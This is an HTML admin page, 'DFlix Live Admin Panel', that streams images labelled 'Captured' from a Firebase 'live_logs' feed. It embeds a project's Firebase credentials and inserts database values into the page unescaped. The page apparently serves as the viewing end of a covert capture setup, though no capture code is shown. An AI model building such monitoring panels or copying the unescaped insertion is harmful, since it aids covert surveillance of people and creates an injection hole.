<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>DFlix Admin - Live Monitoring</title>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
    <style>
        body { background: #111; color: #fff; font-family: 'Segoe UI', sans-serif; padding: 20px; }
        h1 { color: #e50914; border-bottom: 2px solid #333; padding-bottom: 10px; }
        .grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(180px, 1fr)); gap: 15px; margin-top: 20px; }
        .card { background: #222; border-radius: 8px; overflow: hidden; border: 1px solid #444; animation: slideIn 0.3s ease; }
        img { width: 100%; height: 140px; object-fit: cover; cursor: pointer; }
        .footer { padding: 8px; font-size: 11px; text-align: center; color: #aaa; background: #2a2a2a; }
        @keyframes slideIn { from { opacity: 0; transform: translateY(-10px); } to { opacity: 1; transform: translateY(0); } }
    </style>
</head>
<body>

    <h1>DFlix Live Admin Panel</h1>
    <div id="gallery" class="grid"></div>

    <script>
        const firebaseConfig = {
            apiKey: "AIzaSyD7gABQ1j1zMFS9AylLCZr-K1hyK0LkIsQ",
            authDomain: "distark.firebaseapp.com",
            databaseURL: "https://distark-default-rtdb.firebaseio.com",
            projectId: "distark",
            storageBucket: "distark.firebasestorage.app",
            messagingSenderId: "819241583845",
            appId: "1:819241583845:web:2231e652310e47e06cc00c",
            measurementId: "G-X175B7NX2K"
        };
        firebase.initializeApp(firebaseConfig);

        const gallery = document.getElementById('gallery');

        // Firebase Realtime Listener
        firebase.database().ref('live_logs').on('child_added', (snap) => {
            const data = snap.val();
            const html = `
                <div class="card">
                    <img src="${data.url}" onclick="window.open(this.src)">
                    <div class="footer">Captured: ${data.time}</div>
                </div>
            `;
            gallery.insertAdjacentHTML('afterbegin', html);
        });
    </script>
</body>
</html>
